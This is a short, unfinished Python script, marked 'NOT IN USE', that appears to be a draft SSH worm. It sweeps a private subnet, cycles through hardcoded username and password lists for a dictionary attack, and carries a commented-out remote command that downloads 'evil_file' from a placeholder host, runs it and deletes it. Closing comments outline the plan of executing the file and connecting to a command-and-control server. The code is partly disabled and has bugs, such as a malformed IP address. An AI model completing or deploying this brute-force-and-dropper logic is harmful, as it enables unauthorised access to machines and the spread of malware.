import paramiko
import time

# NOT IN USE

user_list = ['fresh1','fresh2','fresh3','fresh4']
pass_list = ['fresh1','fresh2','fresh3','fresh4']
num = 0
num2 = 0


# ssh process
# set policy when host key is unknown
p = paramiko.SSHClient()
p.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def cmd():
#    stdin, stdout, stderr = p.exec_command('wget "127.0.0.0.1/evil_file"; chmod 755 evil_file; ./evil_file; rm evil_file')
    stdin, stdout, stderr = p.exec_command('ls')

    for line in stdout:
        print(line.strip('\n'))
    for line in stderr:
        print(line.strip('\n'))
    p.close()

# Run through network 192.168.203.1/24
# Small dictionary attack for user & password. (not yet implemented)

for i in range(151,153):
    ip = "192.168.203.%d" % i
    try:
        for num in range(0,4):
            for num2 in range(0,4):
#                p.connect(ip, username=user_list[num], password=pass_list[num2])
#                cmd()
                print user_list[num] + " " + pass_list[num2]
                num2 += 1
        num += 1
    except:
        print("Couldn't Connect to : %s" % ip)
        if i ==  256:
            print("IP range ended.")
            break
    i += 1

# if connection successful
# 1. Download file from Web server.
# 2. Execute file, connect to C&C.
# 3. Exit


